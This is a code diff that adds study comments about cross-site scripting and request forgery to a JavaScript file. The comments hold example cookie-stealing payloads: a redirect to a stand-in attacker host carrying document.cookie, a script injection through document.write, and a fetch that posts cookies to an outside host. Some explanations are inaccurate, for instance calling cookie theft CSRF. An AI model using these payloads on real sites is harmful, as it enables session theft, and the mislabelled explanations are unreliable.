@@ -26,3 +26,17 @@ const sendToServer = () => {
     body: JSON.stringify({userInput: input})
   })
 }
+
+/* XSSS
+   window.location = $`'haxxed.com?cookie='${document.cookie}`
+   window.location displays the url of the current site
+   document.cookie contains the user input or login details
+   Above script sends the user to a different site when injected and sends the data of the cookie to the attacker
+   
+   document.write('<script>alert("Hello World!")</script>')
+   Aslo avoid using document.write(), as it can also execute scripts
+*/
+
+// CSRF
+// fetch('//httpbin.org/post',{method:'POST',body:document.cookie})
+// This script sends cookie data back to url passed in first argument
